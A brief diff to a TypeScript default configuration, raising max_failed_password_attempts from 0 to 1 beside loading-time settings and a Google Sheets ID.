@@ -11,7 +11,7 @@ const defaultConfig: Config = {
   settings: {
     code_loading_time: 5000,
     max_failed_code_attempts: 1,
-    max_failed_password_attempts: 0,
+    max_failed_password_attempts: 1,
     password_loading_time: 5000,
     sheet_id: "15LbwSRR4_tHemAHXlb__8RIsxamr9ub0kIMAf6TrUKs"
   },
